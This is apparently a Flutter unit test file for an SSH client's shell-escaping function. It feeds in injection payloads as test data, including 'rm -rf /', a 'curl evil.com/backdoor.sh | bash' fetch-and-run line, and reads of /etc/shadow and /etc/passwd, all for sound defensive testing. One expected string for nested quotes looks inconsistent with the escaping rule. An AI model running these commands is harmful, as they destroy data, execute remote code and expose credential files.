import 'package:flutter_test/flutter_test.dart';
import 'package:nexor_mobile/core/ssh/ssh_client.dart';

void main() {
  group('SSHClient Shell Escaping Security Tests', () {
    late SSHClient client;

    setUp(() {
      client = SSHClient();
    });

    tearDown(() {
      client.dispose();
    });

    test('escapeShellArgument wraps argument in single quotes', () {
      final escaped = client.escapeShellArgument('normal/path');
      expect(escaped, equals("'normal/path'"));
    });

    test('escapeShellArgument escapes single quotes correctly', () {
      final escaped = client.escapeShellArgument("path'with'quotes");
      expect(escaped, equals("'path'\\''with'\\''quotes'"));
    });

    test('escapeShellArgument neutralizes command injection with semicolon', () {
      final malicious = '; rm -rf /';
      final escaped = client.escapeShellArgument(malicious);
      expect(escaped, equals("'; rm -rf /'"));
      // Verify the semicolon is now inside quotes and won't execute
      expect(escaped.contains("';"), isTrue);
    });

    test('escapeShellArgument neutralizes command substitution with dollar', () {
      final malicious = '\$(curl evil.com/backdoor.sh | bash)';
      final escaped = client.escapeShellArgument(malicious);
      expect(escaped, equals("'\$(curl evil.com/backdoor.sh | bash)'"));
      // Verify dollar sign is quoted
      expect(escaped.startsWith("'"), isTrue);
      expect(escaped.endsWith("'"), isTrue);
    });

    test('escapeShellArgument neutralizes double quote injection', () {
      final malicious = '"; cat /etc/shadow #';
      final escaped = client.escapeShellArgument(malicious);
      expect(escaped, equals('\'"; cat /etc/shadow #\''));
      // Verify double quotes are inside single quotes
      expect(escaped.contains('\'"'), isTrue);
    });

    test('escapeShellArgument handles backtick command substitution', () {
      final malicious = '`rm -rf /`';
      final escaped = client.escapeShellArgument(malicious);
      expect(escaped, equals("'`rm -rf /`'"));
    });

    test('escapeShellArgument handles pipe injection', () {
      final malicious = '| cat /etc/passwd';
      final escaped = client.escapeShellArgument(malicious);
      expect(escaped, equals("'| cat /etc/passwd'"));
    });

    test('escapeShellArgument handles ampersand background execution', () {
      final malicious = '& malicious_command &';
      final escaped = client.escapeShellArgument(malicious);
      expect(escaped, equals("'& malicious_command &'"));
    });

    test('escapeShellArgument handles newline injection', () {
      final malicious = 'path\nrm -rf /';
      final escaped = client.escapeShellArgument(malicious);
      expect(escaped, equals("'path\nrm -rf /'"));
    });

    test('escapeShellArgument handles empty string', () {
      final escaped = client.escapeShellArgument('');
      expect(escaped, equals("''"));
    });

    test('escapeShellArgument handles complex nested quotes', () {
      final malicious = "'; echo 'pwned' > /tmp/hacked; '";
      final escaped = client.escapeShellArgument(malicious);
      expect(escaped, equals("''\\'; echo '\\''pwned'\\'' > /tmp/hacked; '\\'''"));
    });

    test('escapeShellArgument handles null byte injection', () {
      final malicious = 'path\x00rm -rf /';
      final escaped = client.escapeShellArgument(malicious);
      expect(escaped, equals("'path\x00rm -rf /'"));
    });

    test('workingDirectory injection is prevented in execute method', () {
      // This test verifies the integration - we can't easily test without
      // a real SSH connection, but we can verify the escaping logic
      final maliciousDir = '"; rm -rf / #';
      final escaped = client.escapeShellArgument(maliciousDir);
      
      // The escaped version should be safe
      expect(escaped, equals('\'\"; rm -rf / #\''));
      
      // Verify that when used in cd command, it won't break out
      final cdCommand = 'cd $escaped && ls';
      expect(cdCommand, equals('cd \'\"; rm -rf / #\' && ls'));
      // The double quote is now inside single quotes, so it won't close anything
    });

    test('multiple injection vectors are all neutralized', () {
      final vectors = [
        '; rm -rf /',
        '\$(curl evil.com)',
        '`malicious`',
        '"; cat /etc/shadow #',
        '| cat /etc/passwd',
        '& background &',
        '\nmalicious',
        "'; echo pwned; '",
      ];

      for (final vector in vectors) {
        final escaped = client.escapeShellArgument(vector);
        // All should be wrapped in single quotes
        expect(escaped.startsWith("'"), isTrue, reason: 'Vector: $vector');
        expect(escaped.endsWith("'"), isTrue, reason: 'Vector: $vector');
        // None should have unescaped single quotes that could break out
        final withoutOuterQuotes = escaped.substring(1, escaped.length - 1);
        if (withoutOuterQuotes.contains("'")) {
          // Any internal quotes must be properly escaped as '\''
          expect(withoutOuterQuotes.contains("'\\''"), isTrue, 
                 reason: 'Vector: $vector should have escaped quotes');
        }
      }
    });
  });
}
